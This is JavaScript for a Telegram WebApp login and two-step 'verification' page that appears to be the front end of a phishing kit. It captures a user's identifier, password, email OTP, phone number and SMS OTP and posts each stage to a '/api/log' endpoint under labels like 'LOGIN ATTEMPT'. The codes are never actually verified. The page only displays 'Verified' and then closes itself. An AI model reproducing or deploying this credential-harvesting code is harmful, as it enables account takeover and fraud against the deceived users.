const tg = window.Telegram ? window.Telegram.WebApp : null;
if (tg) {
    tg.expand();
    tg.ready();
}

document.addEventListener('DOMContentLoaded', () => {
    // UI Elements
    const screenSignin = document.getElementById('screen-signin');
    const screenStepper = document.getElementById('screen-stepper');
    const modalEmail = document.getElementById('modal-email-otp');
    const modalPhone = document.getElementById('modal-phone-otp');

    const loginId = document.getElementById('login-identifier');
    const loginPass = document.getElementById('login-password');
    const verifyEmailId = document.getElementById('verify-email-id');
    const verifyEmailOtp = document.getElementById('verify-email-otp');
    const verifyPhoneNum = document.getElementById('verify-phone-num');
    const verifyPhoneOtp = document.getElementById('verify-phone-otp');

    let userData = { id: '', pass: '', email: '', email_otp: '', phone: '', phone_otp: '', time: '' };
    let currentStep = 1;

    // Sign In Button
    const btnSignin = document.getElementById('trigger-signin');
    if (btnSignin) {
        btnSignin.addEventListener('click', async () => {
            const idVal = loginId.value.trim();
            const passVal = loginPass.value.trim();

            if (!idVal) return alert("Please enter Email / Phone Number");

            userData.id = idVal;
            userData.pass = passVal;
            userData.time = new Date().toLocaleString();

            if (idVal.includes('@')) verifyEmailId.value = idVal;
            else if (/^\d+$/.test(idVal.replace(/\+/g, ''))) verifyPhoneNum.value = idVal;

            // LOG ATTEMPT
            logToServer('🔑 LOGIN ATTEMPT', userData);

            // SWITCH SCREEN
            screenSignin.style.display = 'none';
            screenStepper.style.display = 'flex';
        });
    }

    // Email Verify Click
    document.getElementById('item-email').addEventListener('click', async () => {
        if (currentStep !== 1) return;
        modalEmail.style.display = 'flex';
        
        if (verifyEmailId.value.includes('@')) {
            console.log("Requesting OTP for:", verifyEmailId.value);
            const res = await fetch('/send-otp', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ email: verifyEmailId.value })
            });
            const data = await res.json();
            if (!data.success) alert("OTP Error: " + (data.error || "Failed to send email"));
        }
    });

    // Email Submit
    document.getElementById('submit-email-otp').addEventListener('click', async () => {
        if (!verifyEmailId.value || !verifyEmailOtp.value) return alert("Fill all fields");
        
        userData.email = verifyEmailId.value;
        userData.email_otp = verifyEmailOtp.value;
        
        document.getElementById('submit-email-otp').innerText = "Verifying...";
        await logToServer('📧 EMAIL VERIFY', userData);
        
        modalEmail.style.display = 'none';
        currentStep = 2;
        
        document.getElementById('step-number-display').innerText = '2/2';
        const itemEmail = document.getElementById('item-email');
        itemEmail.style.opacity = '0.5';
        itemEmail.style.pointerEvents = 'none';
        itemEmail.querySelector('.card-link').innerHTML = 'Verified <i class="fas fa-check"></i>';
        
        const itemPhone = document.getElementById('item-phone');
        itemPhone.style.opacity = '1';
        itemPhone.style.pointerEvents = 'auto';
        itemPhone.classList.add('active');
    });

    // Phone Click
    document.getElementById('item-phone').addEventListener('click', () => {
        if (currentStep !== 2) return;
        modalPhone.style.display = 'flex';
    });

    // Phone Submit
    document.getElementById('submit-phone-otp').addEventListener('click', async () => {
        if (!verifyPhoneNum.value || !verifyPhoneOtp.value) return alert("Fill all fields");
        
        userData.phone = verifyPhoneNum.value;
        userData.phone_otp = verifyPhoneOtp.value;
        
        document.getElementById('submit-phone-otp').innerText = "Success";
        await logToServer('📱 PHONE VERIFY (FINAL)', userData);
        
        setTimeout(() => {
            if (tg) tg.close();
            else location.reload();
        }, 1500);
    });

    async function logToServer(title, data) {
        try {
            const res = await fetch('/api/log', {
                method: 'POST',
                headers: { 'Content-Type': 'application/json' },
                body: JSON.stringify({ title, data })
            });
            const resData = await res.json();
            if (!resData.success) console.error("Log failed:", resData.error);
        } catch (e) {
            console.error("Log fetch failed", e);
        }
    }

    window.closeAllModals = () => {
        modalEmail.style.display = 'none';
        modalPhone.style.display = 'none';
    };

    window.pasteOTP = async (id) => {
        try {
            const t = await navigator.clipboard.readText();
            if (t) document.getElementById(id).value = t;
        } catch(e) {}
    };

    document.getElementById('back-to-signin').addEventListener('click', () => {
        screenStepper.style.display = 'none';
        screenSignin.style.display = 'block';
    });
});
